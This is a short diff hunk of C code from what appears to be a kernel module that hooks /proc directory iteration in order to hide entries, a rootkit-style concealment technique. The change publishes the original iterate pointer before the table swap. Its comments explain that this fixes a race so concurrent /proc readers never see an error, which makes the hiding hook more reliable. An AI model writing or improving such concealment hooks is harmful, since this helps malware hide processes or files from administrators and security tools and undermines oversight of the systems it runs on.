@@ -172,6 +172,10 @@ int memd_hide_install(void)
         spin_unlock_irqrestore(&syshook_lock, flags);
         return 0;
     }
+    /* Publish orig BEFORE the table write: a concurrent /proc reader can
+     * enter our iterate the moment the pointer swaps; with orig still
+     * NULL it would return -ENOSYS instead of listing. */
+    orig_iterate = orig;
     /* RO-safe write (guarded, verified). State commits ONLY on verified
      * install: failure paths never lose orig and never report inactive
      * while hooked (retryable + honest, never dangling-silent). */
